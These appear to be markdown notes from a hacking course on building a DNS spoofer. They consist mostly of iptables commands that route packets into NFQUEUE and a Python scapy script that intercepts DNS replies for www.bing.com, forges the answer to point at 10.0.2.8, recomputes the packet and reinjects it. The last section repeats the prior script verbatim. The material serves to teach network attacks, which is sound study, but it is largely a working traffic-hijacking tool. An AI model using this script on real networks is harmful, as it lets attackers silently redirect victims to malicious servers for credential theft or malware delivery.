# what is DNS Spoofing:
### is caused by an attacker with the intent to maliciously redirect traffic from one website to another by forging DNS 
---
### root@kali:~/PycharmProjects/net_cut_DNS_Spoofer# service apache2 start 

---
---
---
# Filtering DNS Responeses
#### also using the name of the website to get the ip 
```
root@kali:~/PycharmProjects/arp_spoof# iptables -I OUTPUT -j NFQUEUE --queue-num 0 
root@kali:~/PycharmProjects/arp_spoof# iptables -I INPUT -j NFQUEUE --queue-num 0
```

```
ping -c 1 www.bing.com
```

```
#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        print(scapy_packet.show())
    packet.accept() # to access


queue = netfilterqueue.NetfilterQueue() # created an instance of netFilterQue object
queue.bind(0, process_packet) # bind() : to connect or bind this queue to the queue that we created here
queue.run() # to run the queue that we created
```
---
---
---
# Analysing & Creating a Custom DNS Response
```
#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if "www.bing.com" in qname:
            print("[+] Spoofing target")
            answer = scapy.DNSRR(rrname=qname, rdata="10.0.2.8") # rdata = the target ip 

    packet.accept() # to access


queue = netfilterqueue.NetfilterQueue() # created an instance of netFilterQue object
queue.bind(0, process_packet) # bind() : to connect or bind this queue to the queue that we created here
queue.run() # to run the queue that we created
```
---
--- 
# Modifying Packets On the Fly
```
#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if "www.bing.com" in qname:
            print("[+] Spoofing target")
            answer = scapy.DNSRR(rrname=qname, rdata="10.0.2.8") # rdata = the target ip
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1
            
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len
            
            packet.set_payload(str(scapy_packet))

    packet.accept() # to access


queue = netfilterqueue.NetfilterQueue() # created an instance of netFilterQue object
queue.bind(0, process_packet) # bind() : to connect or bind this queue to the queue that we created here
queue.run() # to run the queue that we created
``` 

---
---
---
# Redirecting DNS Response
```
#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if "www.bing.com" in qname:
            print("[+] Spoofing target")
            answer = scapy.DNSRR(rrname=qname, rdata="10.0.2.8") # rdata = the target ip
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len

            packet.set_payload(str(scapy_packet))

    packet.accept() # to access


queue = netfilterqueue.NetfilterQueue() # created an instance of netFilterQue object
queue.bind(0, process_packet) # bind() : to connect or bind this queue to the queue that we created here
queue.run() # to run the queue that we created
```